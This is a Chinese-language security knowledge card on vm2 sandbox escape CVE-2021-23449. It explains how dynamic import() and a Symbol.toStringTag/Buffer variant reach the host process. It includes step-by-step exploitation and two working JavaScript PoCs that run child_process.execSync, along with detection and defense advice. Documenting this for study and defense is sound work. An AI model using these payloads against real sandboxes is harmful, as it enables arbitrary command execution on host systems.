---
id: binary-pwn-sandbox-escape-vm2-2021-23449-dynamic-import-host-module
title: vm2 CVE-2021-23449：动态 import() 不经沙箱代理，module 对象 toString.constructor 取宿主 global/process 执行命令
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: vm2-dynamic-import-unsandboxed-module-escape
aliases:
- CVE-2021-23449
- vm2 import() 逃逸
- Dynamic Import not supported
- import 关键字绕过
- Symbol.toStringTag 抛函数逃逸
- Buffer.from(new Map()) 逃逸
tags:
- javascript
- nodejs
- vm2
- sandbox-escape
- dynamic-import
- host-realm
- symbol-tostringtag
- child-process
- rce
cve:
- CVE-2021-23449
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V291
  verified_at: '2026-11-08T08:23:24+08:00'
  notes: 已对照原文核对：import()语法不经沙箱代理、res.toString.constructor("return this")()取宿主global/process、修复为正则替换import并报Dynamic Import not supported、Symbol.toStringTag+Buffer.from(new Map())变体均与原文一致；原文未给版本区间，未设affected_versions；未本机执行。
---

## 一句话结论

vm2 通过 Proxy 包装 `require` 等函数调用，但 `import()` 是 V8 的语法结构而不是普通函数，返回的 module/Promise 对象来自宿主 realm、不经过沙箱代理；沙箱里执行 `import('./foo.js')` 后，用 `res.toString.constructor("return this")()` 取回宿主 global/process，再 `process.mainModule.require("child_process").execSync()` 即可执行任意命令。vm2 的修复只是在编译前用正则替换 `\bimport\b` 并报 `Dynamic Import not supported`，属于黑名单式修复。

## 原理

- vm2 的隔离建立在“对沙箱内可见的函数/对象做 Proxy 包装与属性访问拦截”上。`import()` 是 JavaScript 语法（由 V8 模块加载器实现），不是可从沙箱拿到的普通函数对象，因此 vm2 的 proxy 机制覆盖不到它。
- 沙箱内 `import('./foo.js')` 的返回值（Promise 或 module namespace）由宿主 realm 创建，其方法 `toString` 的 `constructor` 是宿主 `Function`。执行宿主 `Function("return this")()` 返回宿主 global，即可访问 `global.process`。
- `process.mainModule.require("child_process")` 加载内置模块并 `execSync("whoami")`，命令以 Node 进程权限运行；把结果 `toString()` 返回给沙箱即可回显。
- 修复方式：vm2 在编译前对源码做正则匹配，替换 `\bimport\b` 关键字；含该关键字的脚本编译失败并抛 `Dynamic Import not supported`。这是基于关键字的黑名单，理论上可被其它语法/字符串构造绕过（原文未展开具体绕过）。
- 另一个 PoC 利用宿主 `Buffer.from(new Map())` 触发沙箱内 `Symbol.toStringTag` getter：getter `throw` 一个箭头函数，宿主调用路径把该函数带出沙箱，`catch(f)` 后 `f(()=>{})` 中 `f.constructor("return process")()` 取宿主 process。本质同样是“宿主内建触发的回调/异常对象跨 realm 且 constructor 未被代理”。

## 触发条件

- 目标使用受影响的 vm2（CVE-2021-23449；原文未给具体版本区间，修复后的 vm2 会直接拒绝含 `import` 的脚本）。
- 沙箱脚本可由攻击者控制，且 Node.js 运行时支持动态 `import()`（ESM 语法可用）。
- 沙箱内可访问 `Buffer`（Symbol.toStringTag 变体需要）。
- Node.js 宿主为 CommonJS，`process.mainModule` 可用。

## 利用步骤

1. 确认目标为 vm2 沙箱且未禁用 `import`（修复版会在编译期报 `Dynamic Import not supported`）。
2. 在沙箱脚本中执行 `let res = import('./foo.js')`（文件只需存在或为任意合法模块路径）。
3. 对返回对象取 `res.toString.constructor("return this")()` 得到宿主 global/process。
4. `process.mainModule.require("child_process").execSync("whoami").toString()` 执行命令并返回结果。

## PoC

```javascript
let res = import('./foo.js')
res.toString.constructor("return this")().process.mainModule.require("child_process").execSync("whoami").toString();
```

Symbol.toStringTag 变体：

```javascript
Symbol = {
  get toStringTag(){
    throw f=>f.constructor("return process")()
  }
};
try{
  Buffer.from(new Map());
}catch(f){
  Symbol = {};
  f(()=>{}).mainModule.require("child_process").execSync("whoami").toString();
}
```

## 变体与关联

- 变体：`Symbol.toStringTag` getter + `Buffer.from(new Map())` 用宿主内建触发沙箱 getter，把函数对象带到宿主调用栈后再取宿主 `Function`。
- 关联：[[binary-pwn-sandbox-escape-vm2-2019-10761-buffer-write-recursion-error]] 是同产品不同 CVE（宿主错误对象未隔离）；[[binary-pwn-sandbox-escape-vm2-cross-realm-implicit-call]] 是跨 realm 隐式调用逃逸的综述。
- 关联：[[web-nodejs-prototype-pollution-json-clone-vm2-shellcode-backdoor]] 用本卡的 `import()` payload 作为后门 vm2 的 shellcode。

## 检测与防御

- 检测：沙箱源码中是否出现 `import(`、`Symbol.toStringTag`、`Buffer.from(new Map())` 等特征；vm2 是否报 `Dynamic Import not supported`。
- 防御：升级到修复版 vm2 或直接弃用 vm2（已停止维护）；对不可信脚本做 AST 级检查并禁用 `import`/`require`/`Buffer`，不要依赖正则黑名单；使用 `isolated-vm`、独立进程/容器并限制权限，把沙箱逃逸视为进程级 RCE 风险。
